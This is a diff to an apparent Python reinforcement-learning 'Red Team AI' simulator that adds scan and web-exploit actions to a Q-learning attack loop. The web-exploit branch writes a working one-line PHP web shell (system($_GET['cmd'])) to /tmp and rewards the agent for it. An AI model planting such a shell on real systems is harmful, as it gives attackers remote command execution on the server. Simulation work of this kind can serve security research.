@@ -17,7 +17,15 @@ STATE_FILE = os.path.join(BASE_DIR, "war_state.json")
 TARGET_DIR = "/tmp"
 
 # --- AI HYPERPARAMETERS ---
-ACTIONS = ["T1046_RECON", "T1027_OBFUSCATE", "T1003_ROOTKIT", "T1589_LURK"]
+ACTIONS = [
+    "T1046_RECON",          # General Recon
+    "T1027_OBFUSCATE",      # Obfuscation
+    "T1003_ROOTKIT",        # Rootkit
+    "T1589_LURK",           # Lurk
+    "T1046_WIFI_SCAN",      # WiFi Recon (New)
+    "T1046_NET_SCAN",       # Network Scan (New)
+    "T1190_WEB_EXPLOIT"     # Web Exploit (New)
+]
 ALPHA = 0.4
 ALPHA_DECAY = 0.9999
 GAMMA = 0.9
@@ -52,6 +60,7 @@ def access_memory(filepath, data=None):
 def engage_offense():
     global EPSILON, ALPHA
     print(f"{C_RED}[SYSTEM] Red Team AI Initialized. APT Framework: ACTIVE{C_RESET}")
+    print(f"{C_RED}[UPDATE] Capabilities Expanded: WiFi, Network, Web vectors online.{C_RESET}")
     
     while True:
         try:
@@ -103,11 +112,29 @@ def engage_offense():
             elif action == "T1589_LURK":
                 impact = 0
 
+            # New Capabilities
+            elif action == "T1046_WIFI_SCAN":
+                # Simulate WiFi Recon - Low impact, high noise
+                impact = 2
+
+            elif action == "T1046_NET_SCAN":
+                # Simulate Port Scan - Medium impact
+                impact = 3
+
+            elif action == "T1190_WEB_EXPLOIT":
+                # Simulate SQLi/XSS - High impact
+                fname = os.path.join(TARGET_DIR, f"malware_webshell_{int(time.time())}.php")
+                try:
+                     with open(fname, 'w') as f: f.write("<?php system($_GET['cmd']); ?>")
+                     impact = 7
+                except: pass
+
             # 4. REWARDS
             reward = 0
             if impact > 0: reward = R_IMPACT
             if current_alert >= 4 and action == "T1589_LURK": reward = R_STEALTH
             if current_alert == MAX_ALERT and impact > 0: reward = R_CRITICAL
+            if action == "T1190_WEB_EXPLOIT": reward += 5 # Bonus for new capability
             
             # 5. LEARN
             old_val = q_table.get(f"{state_key}_{action}", 0)
